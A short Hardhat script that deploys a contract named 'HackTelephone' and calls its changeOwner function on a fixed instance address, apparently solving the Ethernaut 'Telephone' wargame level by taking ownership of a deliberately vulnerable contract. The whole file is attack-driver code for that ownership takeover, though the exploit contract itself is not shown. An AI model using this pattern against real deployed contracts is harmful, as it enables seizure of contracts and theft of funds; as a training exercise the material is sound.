import { ethers } from "hardhat";

const InstanceAddress = "0x24f45eFb31Fad270B613e624d6A45D8cc5C507F9";

async function main() {
  const Hack = await ethers.getContractFactory("HackTelephone");
  const hack = await Hack.deploy();
  await hack.deployed();

  const txChangeOwner = await hack.changeOwner(InstanceAddress);
  await txChangeOwner.wait();
  console.log("successfully change owner");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
